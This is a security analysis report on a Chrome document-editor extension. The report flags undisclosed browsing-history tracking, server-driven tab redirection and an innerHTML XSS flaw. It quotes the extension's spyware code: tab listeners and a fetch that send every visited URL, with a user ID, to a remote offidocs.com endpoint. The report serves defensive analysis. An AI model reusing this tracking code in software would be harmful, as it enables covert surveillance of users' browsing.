# Vulnerability Report: Document Editor for doc & docx

## Extension Metadata
- **Extension ID**: bpdjlkbbhlnjlggpbofheohnomnibmmm
- **Extension Name**: Document Editor for doc & docx
- **User Count**: ~40,000 users
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-08

## Executive Summary

Document Editor for doc & docx is a Chrome extension that provides document editing capabilities through integration with offidocs.com cloud services. The extension has **CRITICAL security vulnerabilities** including:

1. **Uncontrolled Tab URL Leakage**: Automatically sends all visited URLs to remote server
2. **Potential for Unauthorized Tab Redirection**: Background script can redirect user's active tabs
3. **XSS Vulnerability**: Unsanitized remote HTML content injected into DOM via innerHTML
4. **Excessive Data Collection**: Tracks all user browsing activity without disclosure
5. **No Content Security Policy**: manifest.json lacks CSP, allowing arbitrary script execution

The extension's core functionality (document editing via offidocs.com) is legitimate, but the automatic URL tracking behavior in the background script constitutes surveillance that is not disclosed in the extension's description.

**Overall Risk Level**: CRITICAL

## Vulnerability Details

### 1. CRITICAL: Automatic URL Tracking and Leakage
**Severity**: CRITICAL
**File**: `websecure.js` (lines 5-115)
**Code Evidence**:
```javascript
function getTabInfo(tabId) {
      chrome.tabs.get(tabId, function(tab) {
            if ( ( tab.url.indexOf("offidocs") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
                    urlx =  tab.url;
                    extractaudio(urlx);  // Sends URL to remote server
                    lastUrl = tab.url;
            }
      });
}

chrome.tabs.onActivated.addListener(function(activeInfo) {
        activeTabId = activeInfo.tabId;
        getTabInfo(activeTabId);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        getTabInfo(tabId);
});

async function extractaudio(urlxx) {
    // ... fetches user info from storage ...

    // Sends visited URL to remote server (hex-encoded)
    let cfgv = await fetch('https://www.offidocs.com/media/system/app/checkdownloaddoceditorx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un + "&s=" + servicexx);
}
```

**Analysis**:
- The background service worker monitors ALL tab activations and updates
- Every URL visited (excluding offidocs.com) is sent to `offidocs.com/media/system/app/checkdownloaddoceditorx_2_nav.php`
- URLs are hex-encoded and transmitted with user ID, creating a complete browsing history
- This happens automatically without user interaction or clear disclosure
- The function name `extractaudio` is misleading - it actually tracks URLs

**Verdict**: This is surveillance malware behavior. The extension collects comprehensive browsing history and sends it to a remote server. This violates user privacy expectations and Chrome Web Store policies.

### 2. HIGH: Unauthorized Tab Redirection Capability
**Severity**: HIGH
**File**: `websecure.js` (lines 110-114)
**Code Evidence**:
```javascript
if ( nbv.indexOf("302") !== -1 )   {
       var ybv = 'https://www.offidocs.com/media/system/app/view_edit_doceditor_nav.php?filepath=' + bin2hex(urlxx) + '&u=' + un;
       chrome.tabs.update(chrome.tabs.getCurrent().id, {url: ybv});
}
```

**Analysis**:
- The background script can redirect the user's current tab based on server response
- If the remote server returns content containing "302", the tab is forcefully redirected
- This gives the remote server control over user navigation
- Combined with URL tracking, this creates a system where the server decides which sites users can visit

**Verdict**: This allows server-side control of user browsing, which is a significant security risk. An attacker compromising offidocs.com could inject redirects to phishing sites or malware.

### 3. HIGH: Cross-Site Scripting (XSS) via innerHTML
**Severity**: HIGH
**File**: `popup.js` (lines 66-85, 96-115)
**Code Evidence**:
```javascript
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://www.offidocs.com/media/system/app/checkdownloaddoceditorr_2_nav.php?u=' + username, true);
xhr1.onload = function (e) {
    if (xhr1.readyState === 4) {
        if (xhr1.status === 200) {
            var response1 = xhr1.responseText;
            listfilesx = document.getElementById('listfilesx');
            listfilesx.innerHTML = "<p>List of files detected in this webpage. Click to edit:</p> " + response1;
        }
    }
};
xhr1.send();
```

**Analysis**:
- Remote HTML content from `offidocs.com` is directly injected into DOM using innerHTML
- No sanitization or validation of server response
- If offidocs.com is compromised or returns malicious content, arbitrary JavaScript can execute in extension context
- Extension has `storage` and `tabs` permissions, allowing XSS payload to steal data or manipulate tabs

**Verdict**: Classic XSS vulnerability. Remote content injection without sanitization creates attack vector for extension compromise.

### 4. MEDIUM: No Content Security Policy
**Severity**: MEDIUM
**File**: `manifest.json`
**Analysis**:
- Manifest.json lacks `content_security_policy` directive
- Default MV3 CSP applies, but explicit CSP would prevent inline script execution
- Given the innerHTML XSS vulnerability, this amplifies risk

**Verdict**: Missing security hardening. CSP should be explicitly defined to restrict script sources.

### 5. LOW: Misleading Function Names
**Severity**: LOW
**File**: `websecure.js`
**Analysis**:
- Function `extractaudio()` actually performs URL tracking, not audio extraction
- Function name `websecure()` class suggests security features, but implements surveillance
- This appears to be deliberate obfuscation

**Verdict**: Code obfuscation suggests malicious intent. Misleading naming hides true functionality.

## False Positives

| Pattern | Location | Reason for Exclusion |
|---------|----------|---------------------|
| innerHTML in jQuery | js/jquery.min.js | Standard jQuery library usage for DOM manipulation |
| Function() constructor in jQuery | js/jquery.min.js:505 | Part of jQuery's JSON parsing (legacy code) |
| eval in jQuery | js/jquery.min.js:521 | jQuery's globalEval for script execution in correct context |
| addEventListener patterns | js/*.js | Legitimate event handling for UI interactions |
| Storage access in elFinder | js/elfinder.min.js | File manager library's legitimate storage usage |

## API Endpoints

| Endpoint | Purpose | Data Sent | Risk Level |
|----------|---------|-----------|------------|
| offidocs.com/media/system/app/checkdownloaddoceditorx_2_nav.php | URL tracking | All visited URLs (hex-encoded), username, service ID | CRITICAL |
| offidocs.com/media/system/app/resetlool.php | Service initialization | Username, URL path | MEDIUM |
| offidocs.com/media/system/app/checkdownloaddoceditorr_2_nav.php | File detection | Username | LOW |
| offidocs.com/phpextensions/connector.php | File operations | Username, service ID, file paths | LOW |
| offidocs.com/media/system/app/view_ext.php | Document editor iframe | Service info, username, file paths | LOW |
| offidocs.com/phpextensions/userext.php | User service endpoint | Username | LOW |

## Data Flow Summary

### Data Collection
1. **Browsing History**: ALL URLs visited by user (excluding offidocs.com)
2. **User Identifier**: Random 10-character string generated and stored persistently
3. **Tab State**: Active tab information and navigation events
4. **Preference Data**: "Detect files" checkbox state (offidocscloud setting)

### Data Transmission
- All visited URLs → checkdownloaddoceditorx_2_nav.php (continuous, automatic)
- Username → Multiple offidocs.com endpoints (on extension interaction)
- No encryption beyond HTTPS transport

### Data Storage
- Local storage: username, offidocscloud preference
- No sensitive data stored locally (URLs sent immediately to server)

## Privacy Concerns

1. **Undisclosed Tracking**: Extension description does not mention URL tracking
2. **No User Consent**: Automatic tracking begins immediately after installation
3. **Persistent Identifier**: Random username creates trackable profile across sessions
4. **No Opt-Out**: Users cannot disable URL tracking without disabling extension
5. **Unclear Data Retention**: No privacy policy visible in extension or offidocs.com

## Recommendations

### For Users
1. **UNINSTALL IMMEDIATELY**: This extension is surveillance malware
2. Clear browsing history and cookies after removal
3. Consider which sites were visited while extension was active
4. Report to Chrome Web Store

### For Developers (if legitimate)
If this tracking is intended for document detection:
1. Remove automatic URL tracking from background script
2. Implement opt-in consent for any URL scanning
3. Only scan URLs when user explicitly requests document detection
4. Add clear privacy policy explaining data collection
5. Implement CSP in manifest.json
6. Sanitize all remote HTML before DOM insertion
7. Remove tab redirection capability or require explicit user confirmation

## Overall Risk Assessment

**CRITICAL**

This extension engages in undisclosed surveillance by:
- Automatically tracking all URLs visited by users
- Transmitting complete browsing history to remote server
- Maintaining persistent user identifiers for tracking
- Providing no disclosure or opt-out mechanism

While the document editing functionality appears legitimate, the background URL tracking constitutes malware behavior that violates user privacy and Chrome Web Store policies. The XSS vulnerability and tab redirection capability create additional attack vectors.

**Recommendation**: Flag for immediate removal from Chrome Web Store pending developer explanation of tracking behavior.
